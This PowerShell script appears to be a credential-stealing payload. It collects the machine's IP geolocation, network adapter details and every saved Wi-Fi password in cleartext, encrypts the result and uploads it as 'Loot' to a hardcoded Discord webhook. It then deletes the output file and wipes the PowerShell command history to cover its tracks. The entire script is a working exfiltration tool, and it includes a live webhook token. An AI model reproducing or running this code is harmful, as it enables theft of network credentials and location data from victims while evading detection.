# --- Functions for data ---
function Get-GeoLocation {
    try {
        $Response = Invoke-RestMethod -Uri "http://ip-api.com/json/"
        return [PSCustomObject]@{
            Latitude  = $Response.lat
            Longitude = $Response.lon
            City      = $Response.city
            Country   = $Response.country
            ISP       = $Response.isp
        }
    } catch {
        Write-Error "Failed to retrieve location from IP service"
    }
}

function Get-Networks {
    $NetworkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration |
        Where-Object { $_.MACAddress -ne $null } |
        Select-Object Index, Description, IPAddress, DefaultIPGateway, MACAddress

    $WLANProfileNames = @()
    $Output = netsh.exe wlan show profiles | Select-String -Pattern " : "
    foreach ($WLANProfileName in $Output) {
        $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
    }

    $WLANProfileObjects = @()
    foreach ($WLANProfileName in $WLANProfileNames) {
        try {
            $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear |
                Select-String -Pattern "Key Content") -split ":")[1]).Trim()
        } catch {
            $WLANProfilePassword = "The password is not stored in this profile"
        }
        $WLANProfileObjects += [PSCustomObject]@{
            ProfileName     = $WLANProfileName
            ProfilePassword = $WLANProfilePassword
        }
    }

    return [PSCustomObject]@{
        NetworkAdapters = $NetworkAdapters
        WifiProfiles    = $WLANProfileObjects
    }
}

# --- Gather data ---
$Geo = Get-GeoLocation
$Networks = Get-Networks

$Content = @()
$Content += "==============================="
$Content += "GEOLOCATION"
$Content += "==============================="
$Content += ($Geo | Format-List | Out-String)
$Content += ""
$Content += "==============================="
$Content += "NETWORK ADAPTERS"
$Content += "==============================="
$Content += ($Networks.NetworkAdapters | Format-Table | Out-String)
$Content += ""
$Content += "==============================="
$Content += "WIFI PROFILES"
$Content += "==============================="
$Content += ($Networks.WifiProfiles | Format-Table | Out-String)

$PlainText = $Content -join "`r`n"

# --- AES-256 Encryption ---
# Key derived from username
$KeyBytes = [System.Text.Encoding]::UTF8.GetBytes($env:USERNAME.PadRight(32,'0'))

$AES = [System.Security.Cryptography.Aes]::Create()
$AES.KeySize = 256
$AES.Key = $KeyBytes
$AES.GenerateIV()  # random IV
$Encryptor = $AES.CreateEncryptor()

$PlainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
$CipherBytes = $Encryptor.TransformFinalBlock($PlainBytes,0,$PlainBytes.Length)

# Store IV + ciphertext together
$FinalBytes = $AES.IV + $CipherBytes

# Base64 encode
$B64Encoded = [Convert]::ToBase64String($FinalBytes)

# Save to file
$OutputFile = Join-Path $env:TEMP "$($env:USERNAME)_EncryptedData.txt"
$B64Encoded | Out-File -FilePath $OutputFile -Encoding UTF8

function Upload-Discord {
[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)
$hookurl = 'https://discord.com/api/webhooks/1428302116455186532/dOdkUVnlx0Av1blb5VRDr4-JrUH_Hdta2cTM6m7HJ1oHPV1Mc2DfFwd6x3b1WT0_Gfzp'
$Body = @{
  'Loot' = "$($env:USERNAME)_EncryptedData.txt"
  'content' = $text
}
if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}
Upload-Discord -file "$env:TEMP\$($env:USERNAME)_EncryptedData.txt"

Remove-Item (Join-Path $env:TEMP "$($env:USERNAME)_EncryptedData.txt") -Force -ErrorAction SilentlyContinue

Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
